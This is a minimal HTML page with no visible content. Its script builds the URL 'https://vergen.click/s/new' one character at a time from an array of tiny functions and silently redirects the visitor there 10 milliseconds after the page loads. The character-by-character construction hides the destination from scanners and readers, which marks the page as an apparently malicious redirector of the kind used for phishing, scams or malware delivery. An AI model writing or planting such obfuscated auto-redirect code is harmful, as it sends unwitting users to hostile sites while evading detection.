<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
        const segments = [
            function() { return 'h'; },
            () => 't',
            () => 't',
            _ => 'p',
            () => 's',
            function() { return ':'; },
            () => '/',
            _ => '/',
            _ => 'v',
            () => 'e',
            _ => 'r',
            function() { return 'g'; },
            function() { return 'e'; },
            _ => 'n',
            function() { return '.'; },
            () => 'c',
            () => 'l',
            () => 'i',
            () => 'c',
            _ => 'k',
            _ => '/',
            () => 's',
            () => '/',
            () => 'n',
            () => 'e',
            _ => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
</head>
<body></body>
</html>
